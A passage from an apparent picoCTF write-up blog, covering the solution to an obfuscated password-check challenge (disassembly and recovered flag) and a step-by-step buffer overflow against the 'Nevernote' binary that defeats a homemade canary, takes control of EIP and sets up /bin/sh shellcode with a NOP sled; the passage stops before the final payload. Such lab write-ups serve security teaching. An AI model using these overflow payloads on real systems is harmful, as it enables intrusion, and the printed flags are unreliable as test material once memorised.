</span><span class='line'>   0x80488a6: je     0x80485de
</span><span class='line'>   0x80488ac: mov    edx,0xb
</span><span class='line'>   0x80488b1: jmp    0x80485ab
</span><span class='line'>   0x80488b6: xchg   ax,ax
</span><span class='line'>   // 0x080488b8:k
</span><span class='line'>   0x80488b8: cmp    edx,0xc
</span><span class='line'>   0x80488bb: sete   dl
</span><span class='line'>   0x80488be: xor    eax,eax
</span><span class='line'>   0x80488c0: cmp    BYTE PTR <span class="o">[</span>esp+0x37<span class="o">]</span>,0x0
</span><span class='line'>   0x80488c5: setne  al
</span><span class='line'>   0x80488c8: and    eax,edx
</span><span class='line'>   0x80488ca: jmp    0x80485e0    &lt;- terminate, compares eax to 1. If it is, the string is correct! <span class="nv">Flag</span> <span class="o">=</span> 09vdf7wefijbkh
</span><span class='line'>   0x80488cf: nop
</span><span class='line'>   // 0x080488d0:l
</span><span class='line'>   0x80488d0: cmp    edx,0x13
</span><span class='line'>   0x80488d3: jne    0x80485de
</span><span class='line'>   0x80488d9: cmp    BYTE PTR <span class="o">[</span>esp+0x38<span class="o">]</span>,0x0
</span><span class='line'>   0x80488de: je     0x80485de
</span><span class='line'>   0x80488e4: mov    edx,0x14
</span><span class='line'>   0x80488e9: jmp    0x80485ab
</span><span class='line'>   0x80488ee: xchg   ax,ax
</span><span class='line'>   // 0x080488f0:m
</span><span class='line'>   0x80488f0: cmp    edx,0x11
</span><span class='line'>   0x80488f3: jne    0x80485de
</span><span class='line'>   0x80488f9: cmp    BYTE PTR <span class="o">[</span>esp+0x39<span class="o">]</span>,0x0
</span><span class='line'>   0x80488fe: je     0x80485de
</span><span class='line'>   0x8048904: mov    edx,0x12
</span><span class='line'>   0x8048909: jmp    0x80485ab
</span><span class='line'>   0x804890e: xchg   ax,ax
</span><span class='line'>   // 0x08048910:n
</span><span class='line'>   0x8048910: cmp    edx,0x12
</span><span class='line'>   0x8048913: sete   dl
</span><span class='line'>   0x8048916: xor    eax,eax
</span><span class='line'>   0x8048918: cmp    BYTE PTR <span class="o">[</span>esp+0x39<span class="o">]</span>,0x0
</span><span class='line'>   0x804891d: setne  al
</span><span class='line'>   0x8048920: and    eax,edx
</span><span class='line'>   0x8048922: jmp    0x80485e0
</span><span class='line'>   0x8048927: nop
</span><span class='line'>   // 0x08048928:o
</span><span class='line'>   0x8048928: cmp    BYTE PTR <span class="o">[</span>esp+0x3a<span class="o">]</span>,0x0
</span><span class='line'>   0x804892d: je     0x80485de
</span><span class='line'>   0x8048933: cmp    edx,0x6
</span><span class='line'>   0x8048936: je     0x8048834
</span><span class='line'>   0x804893c: cmp    edx,0x1c
</span><span class='line'>   0x804893f: je     0x8048834
</span><span class='line'>   0x8048945: jmp    0x80485de
</span><span class='line'>   0x804894a: lea    esi,<span class="o">[</span>esi+0x0<span class="o">]</span>
</span><span class='line'>   // 0x08048950:p
</span><span class='line'>   0x8048950: cmp    edx,0x1e
</span><span class='line'>   0x8048953: jne    0x80485de
</span><span class='line'>   0x8048959: cmp    BYTE PTR <span class="o">[</span>esp+0x3c<span class="o">]</span>,0x0
</span><span class='line'>   0x804895e: xchg   ax,ax
</span><span class='line'>   0x8048960: je     0x80485de
</span><span class='line'>   0x8048966: mov    edx,0x1f
</span><span class='line'>   0x804896b: jmp    0x80485ab
</span><span class='line'>   // 0x08048970:q
</span><span class='line'>   0x8048970: cmp    edx,0x1d
</span><span class='line'>   0x8048973: jne    0x80485de
</span><span class='line'>   0x8048979: cmp    BYTE PTR <span class="o">[</span>esp+0x3d<span class="o">]</span>,0x0
</span><span class='line'>   0x804897e: je     0x80485de
</span><span class='line'>   0x8048984: mov    edx,0x1e
</span><span class='line'>   0x8048989: jmp    0x80485ab
</span><span class='line'>   0x804898e: xchg   ax,ax
</span><span class='line'>   // 0x08048990:r
</span><span class='line'>   0x8048990: cmp    edx,0x14
</span><span class='line'>   0x8048993: jne    0x80485de
</span><span class='line'>   0x8048999: cmp    BYTE PTR <span class="o">[</span>esp+0x3e<span class="o">]</span>,0x0
</span><span class='line'>   0x804899e: jne    0x8048668
</span><span class='line'>   0x80489a4: jmp    0x80485de
</span><span class='line'>   0x80489a9: lea    esi,<span class="o">[</span>esi+eiz*1+0x0<span class="o">]</span>
</span><span class='line'>   // 0x080489b0:s
</span><span class='line'>   0x80489b0: cmp    edx,0x19
</span><span class='line'>   0x80489b3: jne    0x80485de
</span><span class='line'>   0x80489b9: cmp    BYTE PTR <span class="o">[</span>esp+0x3f<span class="o">]</span>,0x0
</span><span class='line'>   0x80489be: xchg   ax,ax
</span><span class='line'>   0x80489c0: je     0x80485de
</span><span class='line'>   0x80489c6: mov    edx,0x1a
</span><span class='line'>   0x80489cb: jmp    0x80485ab
</span><span class='line'>   // 0x080489d0:t
</span><span class='line'>   0x80489d0: cmp    edx,0x18
</span><span class='line'>   0x80489d3: sete   dl
</span><span class='line'>   0x80489d6: xor    eax,eax
</span><span class='line'>   0x80489d8: cmp    BYTE PTR <span class="o">[</span>esp+0x3e<span class="o">]</span>,0x0
</span><span class='line'>   0x80489dd: setne  al
</span><span class='line'>   0x80489e0: and    eax,edx
</span><span class='line'>   0x80489e2: jmp    0x80485e0
</span><span class='line'>   0x80489e7: nop
</span><span class='line'>   // 0x080489e8:u
</span><span class='line'>   0x80489e8: cmp    edx,0x1a
</span><span class='line'>   0x80489eb: jne    0x80485de
</span><span class='line'>   0x80489f1: cmp    BYTE PTR <span class="o">[</span>esp+0x41<span class="o">]</span>,0x0
</span><span class='line'>   0x80489f6: je     0x80485de
</span><span class='line'>   0x80489fc: mov    edx,0x1b
</span><span class='line'>   0x8048a01: jmp    0x80485ab
</span><span class='line'>   0x8048a06: xchg   ax,ax
</span><span class='line'>   // 0x08048a08:v
</span><span class='line'>   0x8048a08: cmp    edx,0x2
</span><span class='line'>   0x8048a0b: jne    0x80485de
</span><span class='line'>   0x8048a11: cmp    BYTE PTR <span class="o">[</span>esp+0x42<span class="o">]</span>,0x0
</span><span class='line'>   0x8048a16: je     0x80485de
</span><span class='line'>   0x8048a1c: mov    edx,0x3
</span><span class='line'>   0x8048a21: jmp    0x80485ab
</span><span class='line'>   0x8048a26: xchg   ax,ax
</span><span class='line'>   // 0x08048a28:w
</span><span class='line'>   0x8048a28: cmp    edx,0x6
</span><span class='line'>   0x8048a2b: jne    0x80485de
</span><span class='line'>   0x8048a31: cmp    BYTE PTR <span class="o">[</span>esp+0x43<span class="o">]</span>,0x0
</span><span class='line'>   0x8048a36: je     0x80485de
</span><span class='line'>   0x8048a3c: mov    edx,0x7
</span><span class='line'>   0x8048a41: jmp    0x80485ab
</span><span class='line'>   0x8048a46: xchg   ax,ax
</span><span class='line'>   // 0x08048a48:x
</span><span class='line'>   0x8048a48: cmp    edx,0x16
</span><span class='line'>   0x8048a4b: jne    0x80485de
</span><span class='line'>   0x8048a51: cmp    BYTE PTR <span class="o">[</span>esp+0x44<span class="o">]</span>,0x0
</span><span class='line'>   0x8048a56: je     0x80485de
</span><span class='line'>   0x8048a5c: mov    edx,0x17
</span><span class='line'>   0x8048a61: jmp    0x80485ab
</span><span class='line'>   0x8048a66: xchg   ax,ax
</span><span class='line'>   // 0x08048a68:y
</span><span class='line'>   0x8048a68: cmp    edx,0x17
</span><span class='line'>   0x8048a6b: jne    0x80485de
</span><span class='line'>   0x8048a71: cmp    BYTE PTR <span class="o">[</span>esp+0x45<span class="o">]</span>,0x0
</span><span class='line'>   0x8048a76: je     0x80485de
</span><span class='line'>   0x8048a7c: mov    edx,0x18
</span><span class='line'>   0x8048a81: jmp    0x80485ab
</span><span class='line'>   0x8048a86: xchg   ax,ax
</span><span class='line'>   // 0x08048a88:z
</span><span class='line'>   0x8048a88: cmp    edx,0x15
</span><span class='line'>   0x8048a8b: sete   dl
</span><span class='line'>   0x8048a8e: xor    eax,eax
</span><span class='line'>   0x8048a90: cmp    BYTE PTR <span class="o">[</span>esp+0x2d<span class="o">]</span>,0x0
</span><span class='line'>   0x8048a95: setne  al
</span><span class='line'>   0x8048a98: and    eax,edx
</span><span class='line'>   0x8048a9a: jmp    0x80485e0
</span><span class='line'>   0x8048a9f: cmp    edx,0x4
</span><span class='line'>   0x8048aa2: je     0x8048834
</span><span class='line'>   0x8048aa8: jmp    0x80485de
</span><span class='line'>   0x8048aad: lea    esi,<span class="o">[</span>esi+0x0<span class="o">]</span>
</span><span class='line'>   0x8048ab0: call   0x80483e0 &lt;__stack_chk_fail@plt&gt;
</span></code></pre></td></tr></table></div></figure>


<p>From here, it was a matter of following the <code>mov edx, &lt;n&gt;</code> and <code>cmp edx, &lt;n&gt;</code> instructions. For instance, the first correct char of the password is &lsquo;0&rsquo;. <code>edx</code> is then set to 1. Next, I located the block:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>   // 0x08048758:9
</span><span class='line'>   0x8048758: cmp    edx,0x1
</span><span class='line'>   0x804875b: jne    0x80485de
</span><span class='line'>   0x8048761: cmp    BYTE PTR <span class="o">[</span>esp+0x85<span class="o">]</span>,0x0
</span><span class='line'>   0x8048769: je     0x80485de
</span><span class='line'>   0x804876f: mov    edx,0x2
</span><span class='line'>   0x8048774: jmp    0x80485ab
</span></code></pre></td></tr></table></div></figure>


<p>So the next valid char must be <code>9</code>. I continued this process until I got up to 0x10. There was no <code>cmp edx, 0x10</code>. I verified the chars I had so far. It seems there is some trolling going on. There are two blocks that check for <code>cmp edx, 0x6</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>   // 0x08048a28:w
</span><span class='line'>   0x8048a28: cmp    edx,0x6
</span><span class='line'>   0x8048a2b: jne    0x80485de
</span><span class='line'>   0x8048a31: cmp    BYTE PTR <span class="o">[</span>esp+0x43<span class="o">]</span>,0x0
</span><span class='line'>   0x8048a36: je     0x80485de
</span><span class='line'>   0x8048a3c: mov    edx,0x7
</span><span class='line'>   0x8048a41: jmp    0x80485ab
</span><span class='line'>   0x8048a46: xchg   ax,ax
</span><span class='line'>
</span><span class='line'>   ...and...
</span><span class='line'>
</span><span class='line'>   // 0x08048928:o
</span><span class='line'>   0x8048928: cmp    BYTE PTR <span class="o">[</span>esp+0x3a<span class="o">]</span>,0x0
</span><span class='line'>   0x804892d: je     0x80485de
</span><span class='line'>   0x8048933: cmp    edx,0x6
</span><span class='line'>   0x8048936: je     0x8048834
</span><span class='line'>   0x804893c: cmp    edx,0x1c
</span><span class='line'>   0x804893f: je     0x8048834
</span><span class='line'>   0x8048945: jmp    0x80485de
</span><span class='line'>   0x804894a: lea    esi,<span class="o">[</span>esi+0x0<span class="o">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>At first, I had selected &lsquo;o&rsquo;, but it turns out it should have been &lsquo;w&rsquo;. The string comparison stops at &lsquo;k&rsquo;:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>   // 0x080488b8:k
</span><span class='line'>   0x80488b8: cmp    edx,0xc
</span><span class='line'>   0x80488bb: sete   dl
</span><span class='line'>   0x80488be: xor    eax,eax
</span><span class='line'>   0x80488c0: cmp    BYTE PTR <span class="o">[</span>esp+0x37<span class="o">]</span>,0x0
</span><span class='line'>   0x80488c5: setne  al
</span><span class='line'>   0x80488c8: and    eax,edx
</span><span class='line'>   0x80488ca: jmp    0x80485e0    &lt;- terminate, compares eax to 1.
</span><span class='line'>                                       If it is, the string is correct!
</span><span class='line'>   0x80488cf: nop
</span></code></pre></td></tr></table></div></figure>


<p>Through a bit of trial-and-error I arrived at the password:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/picoctf/obfus<span class="nv">$ </span>./obfuscate
</span><span class='line'>Password: 09vdf7wefijbkh
</span><span class='line'>Correct!
</span></code></pre></td></tr></table></div></figure>


<p>So the flag is <code>09vdf7wefijbkh</code>.</p>

<h1>Nevernote (180 points)</h1>

<p><code>
In light of the recent attacks on their machines, Daedalus Corp has
implemented a buffer overflow detection library. Nevernote, a program made
for Daedalus Corps employees to take notes, uses this library. Can you
bypass their protection and read the secret? The binary can be found at
 /home/nevernote/ on the shell server.
</code></p>

<p>This program attempts to implement a stack canary in a rather dumb way:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">struct</span> <span class="n">canary</span><span class="p">{</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">canary</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">int</span> <span class="o">*</span><span class="n">verify</span><span class="p">;</span>
</span><span class='line'><span class="p">};</span>
</span><span class='line'>
</span><span class='line'><span class="cm">/* buffer overflow resistant buffer */</span>
</span><span class='line'><span class="k">struct</span> <span class="n">safe_buffer</span><span class="p">{</span>
</span><span class='line'>    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="n">SAFE_BUFFER_SIZE</span><span class="p">];</span>
</span><span class='line'>    <span class="k">struct</span> <span class="n">canary</span> <span class="n">can</span><span class="p">;</span>
</span><span class='line'><span class="p">};</span>
</span></code></pre></td></tr></table></div></figure>


<p>So we can overflow this <code>safe_buffer</code>, but then we also overwrite the canary. Then the canary check will not pass anymore:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">void</span> <span class="nf">verify_canary</span><span class="p">(</span><span class="k">struct</span> <span class="n">canary</span> <span class="o">*</span><span class="n">c</span><span class="p">){</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">c</span><span class="o">-&gt;</span><span class="n">canary</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="n">c</span><span class="o">-&gt;</span><span class="n">verify</span><span class="p">)){</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Canary was incorrect!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="n">__canary_failure</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// we&#39;re all good; free the canary and return</span>
</span><span class='line'>    <span class="n">free</span><span class="p">(</span><span class="n">c</span><span class="o">-&gt;</span><span class="n">verify</span><span class="p">);</span>
</span><span class='line'>    <span class="k">return</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>But since we can overflow the buffer, we control both the canary and the pointer to the canary. This means we can make this check always succeed. Again, no ASLR on the target server allows us to use a static address. This address is simply the address of a string in the binary (&ldquo;strncpy&rdquo;). This is automated like so (it echoes a username and the command for adding a note):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">pico1139</span><span class="err">@</span><span class="nl">shell</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">nevernote</span><span class="err">$</span> <span class="p">(</span><span class="n">echo</span> <span class="s">&quot;bleh&quot;</span><span class="p">;</span> <span class="n">echo</span> <span class="s">&quot;a&quot;</span><span class="p">;</span> <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="err">&#39;</span><span class="n">print</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;AAAA&quot;</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\x50\xc0\x04\x08</span><span class="s">&quot;</span><span class="err">&#39;</span><span class="p">)</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">in</span>
</span><span class='line'><span class="p">...</span><span class="n">snip</span><span class="p">...</span>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">r</span> <span class="o">&lt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">in</span>
</span><span class='line'><span class="n">The</span> <span class="n">program</span> <span class="n">being</span> <span class="n">debugged</span> <span class="n">has</span> <span class="n">been</span> <span class="n">started</span> <span class="n">already</span><span class="p">.</span>
</span><span class='line'><span class="n">Start</span> <span class="n">it</span> <span class="n">from</span> <span class="n">the</span> <span class="n">beginning</span><span class="o">?</span> <span class="p">(</span><span class="n">y</span> <span class="n">or</span> <span class="n">n</span><span class="p">)</span> <span class="n">y</span>
</span><span class='line'>
</span><span class='line'><span class="n">Starting</span> <span class="nl">program</span><span class="p">:</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">nevernote</span><span class="o">/</span><span class="n">nevernote</span> <span class="o">&lt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">in</span>
</span><span class='line'><span class="n">Please</span> <span class="n">enter</span> <span class="n">your</span> <span class="nl">name</span><span class="p">:</span> <span class="n">Enter</span> <span class="n">a</span> <span class="nl">command</span><span class="p">:</span> <span class="n">Write</span> <span class="n">your</span> <span class="nl">note</span><span class="p">:</span> <span class="n">Note</span> <span class="n">added</span><span class="p">.</span>
</span><span class='line'><span class="o">***</span> <span class="n">Error</span> <span class="n">in</span> <span class="err">`</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">nevernote</span><span class="o">/</span><span class="n">nevernote</span><span class="err">&#39;</span><span class="o">:</span> <span class="kt">double</span> <span class="n">free</span> <span class="n">or</span> <span class="n">corruption</span> <span class="p">(</span><span class="o">!</span><span class="n">prev</span><span class="p">)</span><span class="o">:</span> <span class="mh">0x0804c050</span> <span class="o">***</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now, the binary aborts because the pointer to the canary has already been freed. Not a problem, we won&rsquo;t let it come that far. Let&rsquo;s try to overflow the saved return address:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">pico1139</span><span class="err">@</span><span class="nl">shell</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">nevernote</span><span class="err">$</span> <span class="p">(</span><span class="n">echo</span> <span class="s">&quot;bleh&quot;</span><span class="p">;</span> <span class="n">echo</span> <span class="s">&quot;a&quot;</span><span class="p">;</span> <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="err">&#39;</span><span class="n">print</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;AAAA&quot;</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\x50\xc0\x04\x08CC</span><span class="s">CCCCCCCCCCCCCCDDDDEEEEFFFF&quot;</span><span class="err">&#39;</span><span class="p">)</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">in</span>
</span><span class='line'><span class="p">...</span>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">r</span> <span class="o">&lt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">in</span>
</span><span class='line'><span class="n">Starting</span> <span class="nl">program</span><span class="p">:</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">nevernote</span><span class="o">/</span><span class="n">nevernote</span> <span class="o">&lt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">in</span>
</span><span class='line'><span class="n">Please</span> <span class="n">enter</span> <span class="n">your</span> <span class="nl">name</span><span class="p">:</span> <span class="n">Enter</span> <span class="n">a</span> <span class="nl">command</span><span class="p">:</span> <span class="n">Write</span> <span class="n">your</span> <span class="nl">note</span><span class="p">:</span>
</span><span class='line'><span class="n">Program</span> <span class="n">received</span> <span class="n">signal</span> <span class="n">SIGSEGV</span><span class="p">,</span> <span class="n">Segmentation</span> <span class="n">fault</span><span class="p">.</span>
</span><span class='line'><span class="mh">0xf7ea11f3</span> <span class="n">in</span> <span class="o">??</span> <span class="p">()</span> <span class="n">from</span> <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">i386</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libc</span><span class="p">.</span><span class="n">so</span><span class="mf">.6</span>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">i</span> <span class="n">r</span>
</span><span class='line'><span class="n">eax</span>            <span class="mh">0x45454545</span>  <span class="mi">1162167621</span>
</span><span class='line'><span class="n">ecx</span>            <span class="mh">0xffffd414</span>  <span class="o">-</span><span class="mi">11244</span>
</span><span class='line'><span class="n">edx</span>            <span class="mh">0x45454545</span>  <span class="mi">1162167621</span>
</span><span class='line'><span class="n">ebx</span>            <span class="mh">0x3f4</span>   <span class="mi">1012</span>
</span><span class='line'><span class="n">esp</span>            <span class="mh">0xffffd3f0</span>  <span class="mh">0xffffd3f0</span>
</span><span class='line'><span class="n">ebp</span>            <span class="mh">0xffffd628</span>  <span class="mh">0xffffd628</span>
</span><span class='line'><span class="n">esi</span>            <span class="mh">0xffffd420</span>  <span class="o">-</span><span class="mi">11232</span>
</span><span class='line'><span class="n">edi</span>            <span class="mh">0x45454545</span>  <span class="mi">1162167621</span>
</span><span class='line'><span class="n">eip</span>            <span class="mh">0xf7ea11f3</span>  <span class="mh">0xf7ea11f3</span>
</span><span class='line'><span class="n">eflags</span>         <span class="mh">0x10282</span> <span class="p">[</span> <span class="n">SF</span> <span class="n">IF</span> <span class="n">RF</span> <span class="p">]</span>
</span><span class='line'><span class="n">cs</span>             <span class="mh">0x23</span>    <span class="mi">35</span>
</span><span class='line'><span class="n">ss</span>             <span class="mh">0x2b</span>    <span class="mi">43</span>
</span><span class='line'><span class="n">ds</span>             <span class="mh">0x2b</span>    <span class="mi">43</span>
</span><span class='line'><span class="n">es</span>             <span class="mh">0x2b</span>    <span class="mi">43</span>
</span><span class='line'><span class="n">fs</span>             <span class="mh">0x0</span> <span class="mi">0</span>
</span><span class='line'><span class="n">gs</span>             <span class="mh">0x63</span>    <span class="mi">99</span>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">i</span> <span class="err">$</span><span class="n">eip</span>
</span><span class='line'><span class="o">=&gt;</span> <span class="mh">0xf7ea11f3</span><span class="o">:</span>   <span class="n">movlpd</span> <span class="o">%</span><span class="n">xmm1</span><span class="p">,(</span><span class="o">%</span><span class="n">edx</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Right, a segfault because <code>edx</code> points to a place that doesn&rsquo;t exist. Let&rsquo;s fix that by supplying the address of safe_buffer:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">pico1139</span><span class="err">@</span><span class="nl">shell</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">nevernote</span><span class="err">$</span> <span class="p">(</span><span class="n">echo</span> <span class="s">&quot;bleh&quot;</span><span class="p">;</span> <span class="n">echo</span> <span class="s">&quot;a&quot;</span><span class="p">;</span> <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="err">&#39;</span><span class="n">print</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;AAAA&quot;</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\x50\xc0\x04\x08CC</span><span class="s">CCCCCCCCCCCCCCDDDD</span><span class="se">\x50\xc0\x04\x08FF</span><span class="s">FF&quot;</span><span class="err">&#39;</span><span class="p">)</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">in</span>
</span><span class='line'><span class="p">...</span>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">r</span> <span class="o">&lt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">in</span>
</span><span class='line'><span class="n">Starting</span> <span class="nl">program</span><span class="p">:</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">nevernote</span><span class="o">/</span><span class="n">nevernote</span> <span class="o">&lt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">in</span>
</span><span class='line'><span class="n">Please</span> <span class="n">enter</span> <span class="n">your</span> <span class="nl">name</span><span class="p">:</span> <span class="n">Enter</span> <span class="n">a</span> <span class="nl">command</span><span class="p">:</span> <span class="n">Write</span> <span class="n">your</span> <span class="nl">note</span><span class="p">:</span>
</span><span class='line'><span class="n">Program</span> <span class="n">received</span> <span class="n">signal</span> <span class="n">SIGSEGV</span><span class="p">,</span> <span class="n">Segmentation</span> <span class="n">fault</span><span class="p">.</span>
</span><span class='line'><span class="mh">0x44444444</span> <span class="n">in</span> <span class="o">??</span> <span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>w00t! We have control over EIP! Since ASLR is off and so is NX, we can just jump a piece of shellcode. Let’s stick in the shellcode (23 bytes /bin/sh) and alter the canary to 4*0x90 (which is the start of the NOP sled). Let&rsquo;s overwrite EIP with <code>0x804c070</code> to jump in the middle of our NOP sled. We cat the payload &amp; use another cat to keep shell alive:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
